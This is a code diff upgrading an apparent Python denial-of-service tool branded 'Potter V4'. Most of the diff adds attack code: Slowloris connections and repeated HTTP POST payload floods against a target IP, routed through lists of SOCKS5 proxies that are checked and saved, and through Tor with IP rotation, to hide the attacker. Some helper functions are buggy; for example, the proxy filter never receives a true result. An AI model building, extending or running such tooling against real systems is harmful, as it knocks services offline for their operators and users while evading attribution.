@@ -7,11 +7,15 @@ import time
 import socks
 import ssl
 import string
+import requests
 
 from stem import Signal
 from stem.control import Controller
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
 
-
+def datet():
+    return datetime.today().date()
 
 from colorama import Fore, Back, Style
 fore_colors = {
@@ -57,7 +61,8 @@ banner = f"""{fore_colors['yellow']}{styles['bright']}
 =|_ _|= / _|___ ___| |=| |_| |_  ___   _ _| |_ _  _| |_| |_  _ __  
  =| | =|  _/ -_) -_) |=|  _| ' \/ -_)=| '_| ' \ || |  _| ' \| '  \ 
 =|___|=|_| \___\___|_|= \__|_||_\___|=|_| |_||_\_, |\__|_||_|_|_|_|=
-===============================================|__/{back_colors['green']}By.=Potter=V3====={back_colors['reset']} {styles['reset']}
+===============================================|__/{back_colors['green']}By.=Potter=V4====={back_colors['reset']} {styles['reset']}
+>>{fore_colors['cyan']}Github:{fore_colors['reset']} {styles['bright']}https://github.com/Faminee777xxx/I-feel-the-rhythm{styles['reset']}
     {fore_colors['reset']}"""
 
 help = f"""
@@ -86,30 +91,30 @@ Options:                            What it do:
   //--tor-port                    Use TOR Port
   //--change-tor-ip -c-tor-ip     Change Tor ip when Attacking
     \Proxy
-  //--proxy-ip <IP>               Use proxy IP
-  //--proxy-port <PORT>           Use proxy Port
+  //--proxy-ip <IP>                 Use proxy IP
+  //--proxy-port <PORT>             Use proxy Port
+  //--proxy-lists <proxy_lists.txt> Use more proxys
+    //--check-proxy-list            Check proxy in proxy list
     """
 
 def clear_terminal():
     os.system("clear")
 
 def banner_when_attack(ip, port, threads, ran):
-    
     print(banner)
     print(f"""
-+-{back_colors['green']}Attacking{back_colors['reset']}---------------------------+
-          
-Target_IP   : {styles['bright']}{ip}
-Target-Port : {port}
-Threads     : {threads}
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-Random UA   : {ran}
-Socks       : {num_sockets}
+Target Information+-+-+-+-+-+-+-+-+-+-+-+
+  {back_colors['magenta']}IP Address{back_colors['reset']}   : {ip}
+  {back_colors['magenta']}Port{back_colors['reset']}         : {port}
 
-[{back_colors['green']}+{back_colors['reset']}] Packet sent...
-**Ctrl+C to {back_colors['red']}exit{back_colors['reset']}**{styles['reset']}
-+-{back_colors['green']}Attacking{back_colors['reset']}---------------------------+
-    """)
+Attack Parameters+-+-+-+-+-+-+-+-+-+-+-+-+
+  {back_colors['magenta']}Threads{back_colors['reset']}      : {threads}
+  {back_colors['magenta']}Random UA{back_colors['reset']}    : {ran}
+  {back_colors['magenta']}Sockets{back_colors['reset']}      : {num_sockets}
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+{back_colors['green']}{styles['bright']}[+] Packet sent...{back_colors['reset']}
+{back_colors['red']}[!] Press Ctrl+C to {styles['bright']}exit{back_colors['reset']}{back_colors['red']}{styles['reset']}
+""")
     # clear_terminal()
 
 parser = argparse.ArgumentParser(description=banner, add_help=False)
@@ -130,6 +135,8 @@ parser.add_argument("--random-payload", required=False, action='store_true', hel
 # Proxy
 parser.add_argument("--proxy-ip", required=False, help="Use proxy (ip)")
 parser.add_argument("--proxy-port", required=False, type=int, help="Use proxy (port)")
+parser.add_argument("--proxy-list", required=False, type=str, help="Use proxylists> ip:port")
+parser.add_argument("--check-proxy-list", required=False, action='store_true', help="Check all proxys in lists")
 
 # Tor
 parser.add_argument("--tor-ip", required=False, help="Use Tor (ip)")
@@ -156,16 +163,24 @@ random_payload = args.random_payload
 # Proxy
 proxy_ip = args.proxy_ip
 proxy_port = args.proxy_port
+proxy_lists = args.proxy_list
 
 # Tor
 tor_ip = args.tor_ip
 tor_port = args.tor_port
 change_tor = args.change_tor_ip
 
-print("Target IP:", target_ip)
-print("Target Port:", port_target)
-print("Number of Threads:", num_thread)
 
+def want_to_continue():
+    while True:
+        wanna = input(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Do you want to continue?(Y/n):{styles['reset']} ")
+        if wanna in Y_ANSWER:
+            time.sleep(2)
+        elif wanna in N_ANSWER:
+            time.sleep(2)
+            exit()
+        else:
+            print(f"[{back_colors['red']}?{back_colors['reset']}] {styles['bright']}What try again(Y/N){styles['reset']}\n")
 
 def check_target(target_ip, target_port, timeout=3):
     try:
@@ -270,6 +285,88 @@ def slowloris_attack_with_proxy():
                     err_msg = str(e)
                     print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {err_msg}{styles['reset']}")
         time.sleep(10)
+
+
+
+# ฟังก์ชันสร้าง socket ผ่าน proxy
+def create_socket_via_proxy(proxy_ip_port):
+    proxy_ip, proxy_port = proxy_ip_port.split(":")
+    proxy_port = int(proxy_port)
+    s = socks.socksocket()
+    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    s.settimeout(5)
+    s.connect((target_ip, port_target))
+    user_agent = random.choice(user_agents)
+    http_get = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n"
+    s.send(http_get.encode())
+    return s
+
+def slowloris_with_proxy_list(proxy_ip_port):
+    sockets = []
+    # สร้าง socket เริ่มต้น
+    for _ in range(num_sockets):
+        try:
+            s = create_socket_via_proxy(proxy_ip_port)
+            sockets.append(s)
+        except Exception as e:
+            print(f"[FAIL] สร้าง socket ผ่าน proxy {proxy_ip_port} ไม่ได้: {e}")
+
+    print(f"[INFO] เริ่มโจมตีด้วย proxy {proxy_ip_port} จำนวน socket: {len(sockets)}")
+
+    while True:
+        for s in sockets[:]:
+            try:
+                s.send(b"X-a: b\r\n")
+            except Exception:
+                sockets.remove(s)
+                try:
+                    new_s = create_socket_via_proxy(proxy_ip_port)
+                    sockets.append(new_s)
+                except Exception as e:
+                    print(f"[FAIL] สร้าง socket ใหม่ผ่าน proxy {proxy_ip_port} ไม่ได้: {e}")
+        time.sleep(10)
+
+# proxy_list_attack
+def load_proxies():
+    with open(proxy_lists, "r") as f:
+        return [line.strip() for line in f if line.strip()]
+
+def test_proxy(proxy):
+    proxies = {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}",
+    }
+    try:
+        response = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5)
+        if response.status_code == 200:
+            print(f"[{back_colors['green']}OK{back_colors['reset']}] {styles['bright']}Proxy {proxy} =>{styles['reset']} {response.json()}\n")
+            return True
+        else:
+            print(f"[{back_colors['red']}FAIL{styles['reset']}] Proxy {styles['bright']}{proxy}{styles['reset']} => {styles['bright']}{e}{styles['reset']}\n")
+            return False
+    except Exception as e:
+        print(f"[{back_colors['red']}FAIL{styles['reset']}] Proxy {styles['bright']}{proxy}{styles['reset']} => {styles['bright']}{e}{styles['reset']}\n")
+        return False
+    
+
+# โหมดสุ่ม proxy
+def use_random_proxy(proxies):
+    proxy = random.choice(proxies)
+    test_proxy(proxy)
+
+# โหมดวนลูป proxy ทีละตัว
+def use_all_proxies(proxies):
+    for proxy in proxies:
+        test_proxy(proxy)
+        time.sleep(1)  # พัก 1 วินาทีระหว่างการทดสอบ
+
+def filter_proxies(proxy_list):
+    working_proxies = []
+    for proxy in proxy_list:
+        proxy = proxy.strip()
+        if use_all_proxies(proxy):
+            working_proxies.append(proxy)
+    return working_proxies
 
 
 def create_socket_tor():
@@ -423,6 +520,50 @@ def send_payload(use_tor=False, proxy_ip=None, proxy_port=None):
                 pass
             time.sleep(1)
 
+def send_payload_with_proxy_list(proxy_ip_port=None):
+    while True:
+        try:
+            if proxy_ip_port:
+                proxy_ip, proxy_port = proxy_ip_port.split(":")
+                proxy_port = int(proxy_port)
+                s = socks.socksocket()
+                s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+            s.settimeout(5)
+            s.connect((target_ip, port_target))
+
+            user_agent = random.choice(user_agents)
+
+            req = (
+                f"POST / HTTP/1.1\r\n"
+                f"Host: {target_ip}\r\n"
+                f"User-Agent: {user_agent}\r\n"
+                f"Content-Length: {len(size_of_payload)}\r\n"
+                f"Connection: keep-alive\r\n\r\n"
+                f"{size_of_payload}"
+            )
+            s.sendall(req.encode())
+            s.close()
+            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sended payload via proxy {proxy_ip_port if proxy_ip_port else 'direct connection'}{styles['normal']}")
+            time.sleep(0.1)
+
+        except socket.timeout:
+            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Timeout while sending payload{styles['reset']}")
+            try:
+                s.close()
+            except:
+                pass
+            time.sleep(1)
+        except Exception as e:
+            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error sending payload: {e}")
+            try:
+                s.close()
+            except:
+                pass
+            time.sleep(1)
+
 def https_attack():
     try:
         raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -460,7 +601,9 @@ if args.help_menu:
     exit()
 else:
     pass
+
 if check_target(target_ip, port_target):
+    threads = []
     if args.random_agent:
         rand_ua = True
     else:
@@ -470,7 +613,6 @@ if check_target(target_ip, port_target):
     print(f"[{back_colors['green']}*{back_colors['reset']}] {styles['bright']}Checking...{styles['reset']}")
     time.sleep(1)
     for i in range(num_thread):
-
         # TOR Attack (slowloris)
         if args.slowloris_attack and args.tor_ip and args.tor_port:
             if check_tor_running():
@@ -488,13 +630,48 @@ if check_target(target_ip, port_target):
                 time.sleep(3)
 
                 exit()
-
+            
 
         # Proxy Attack (Slowloris)
         elif args.slowloris_attack and args.proxy_ip and args.proxy_port:
             t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
         
+        elif args.slowloris_attack and args.proxy_list:
+            if args.check_proxy_list:
+                proxy_list = load_proxies()
+                print(f"{styles['bright']}!>> Testing proxys in {proxy_lists} <<!{styles['reset']}")
+                # Check all proxys in list
+                use_all_proxies(proxy_list)
+                want_to_continue()
 
+                good_proxies = filter_proxies(proxy_list)
+                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Proxy that can actually be used{styles['reset']}, StatusCode: {back_colors['green']}200{back_colors['reset']}")
+                for p in good_proxies:
+                    print(p)
+                date = datet()
+                file_output = f"working_proxies_{date}.txt"
+                with open(file_output, "w") as f:
+                    for p in good_proxies:
+                        f.write(p + "\n")
+
+            else:
+                pass
+            # โหลด proxy list จากไฟล์
+            if args.check_proxy_list:
+                with open(file_output, "r") as f:
+                    proxies = [line.strip() for line in f if line.strip()]
+            else:
+                proxies = load_proxies()
+
+            for proxy in proxies:
+                t = threading.Thread(target=slowloris_with_proxy_list, args=(proxy,))
+                t.daemon = True
+                t.start()
+                threads.append(t)
+
+            # รัน thread ไปเรื่อย ๆ
+            for t in threads:
+                t.join()
 
         # Slowloris Attack_Normal
         elif args.slowloris_attack:
@@ -525,7 +702,40 @@ if check_target(target_ip, port_target):
                 send_payload()
             
             t = threading.Thread(target=send_payload, daemon=True)
+        elif args.payload_attack and args.proxy_list:
+            if args.check_proxy_list:
+                proxy_list = load_proxies()
+                print(f"{styles['bright']}!>> Testing proxys in {proxy_lists} <<!{styles['reset']}")
+                # Check all proxys in list
+                use_all_proxies(proxy_list)
+                want_to_continue()
 
+                good_proxies = filter_proxies(proxy_list)
+                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Proxy that can actually be used{styles['reset']}, StatusCode: {back_colors['green']}200{back_colors['reset']}")
+                for p in good_proxies:
+                    print(p)
+                date = datet()
+                file_output = f"working_proxies_{date}.txt"
+                with open(file_output, "w") as f:
+                    for p in good_proxies:
+                        f.write(p + "\n")
+            else:
+                pass
+            # โหลด proxy list จากไฟล์
+            if args.check_proxy_list:
+                with open(file_output, "r") as f:
+                    proxies = [line.strip() for line in f if line.strip()]
+            else:
+                proxies = load_proxies()
+
+            for proxy in proxies:
+                t = threading.Thread(target=send_payload, args=(proxy,))
+                t.daemon = True
+                t.start()
+                threads.append(t)
+
+            for t in threads:
+                t.join()
         # Https Attak
         elif args.port == 443:
             t = threading.Thread(target=https_attack, daemon=True)
